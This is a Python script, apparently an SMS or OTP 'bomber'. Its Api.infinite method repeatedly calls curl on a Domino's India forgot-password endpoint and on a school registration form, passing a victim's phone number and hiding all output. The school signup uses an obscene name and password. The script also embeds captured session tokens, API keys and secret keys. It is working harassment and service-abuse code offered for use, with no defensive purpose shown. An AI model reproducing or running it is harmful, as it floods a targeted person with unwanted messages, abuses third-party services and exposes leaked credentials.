import os
class Api():
        def infinite(target, color, msgs):
                times = 0
                while True:

                        os.popen('''curl -X POST -H "Host:api.dominos.co.in" -H "content-length:52" -H "strict-transport-security:max-age=1636116872593" -H "access-control-allow-methods:GET, POST, PATCH, PUT, DELETE, OPTIONS" -H "x-content-type-options:nosniff" -H "api_key:d2aeb489bb8df385" -H "ga_client_id:559252815.1604559839" -H "status:SUCCESS" -H "secretkey:dqsqauugzIzgyNZW6iPkjIHlzFIiPvXo8S+CIytp" -H "userid:48747cab-a7b9-4dc9-b8dc-eabbb9883d72" -H "x-forwarded-for-requestid:1604559920579-48747cab-a7b9-4dc9-b8dc-eabbb9883d72" -H "cartid:1823648622264698" -H "source:PWA18#upsellC" -H "isloggedin:false" -H "client_type:web app-chrome" -H "accesskeyid:ASIAWMIT2NXASDYLBK5W1604559840" -H "x-frame-options:mitigate" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "credentials:[object Object]" -H "deliverytype:D" -H "authtoken:ASIAWMIT2NXASDYLBK5W1604559840" -H "access-control-allow-origin:" -H "accept:application/json, text/plain, */" -H "sessiontoken:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDQ1NjEwNDAsInVzZXJJZCI6IjQ4NzQ3Y2FiLWE3YjktNGRjOS1iOGRjLWVhYmJiOTg4M2Q3MiJ9.X59BK5JPeEwBfA0J3IRgN23BgYIfFW_la_ZfNHLn0C8" -H "content-type:application/json" -H "access-control-allow-headers:*" -H "storeid:6585R" -H "ab_test_variant:New Flow" -H "origin:https://m.dominos.co.in" -H "sec-fetch-site:same-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://m.dominos.co.in/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -d '{"lastName":"","mobile":"'''+target+'''","firstName":""}' "https://api.dominos.co.in/loginhandler/forgotpassword" > /dev/null 2>&1''')
                        times = times+1

                        os.popen('''
                        curl -X POST -H "Host:asvmfaizabad.org" -H "Connection:keep-alive" -H "Content-Length:83" -H "Cache-Control:max-age=0" -H "Upgrade-Insecure-Requests:1" -H "Origin:http://asvmfaizabad.org" -H "Content-Type:application/x-www-form-urlencoded" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36" -H "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9" -H "Referer:http://asvmfaizabad.org/register.php" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -H "Cookie:wh-widget-cookie=1" -d 'sname=Madarchod&sclass=XII&sphone='''+target+'''&spassword=Madarchod&ssection=A&submit=' "http://asvmfaizabad.org/register.php"  > /dev/null 2>&1
                        ''')

                        if times > msgs*3:
                                break
                        else:
                                pass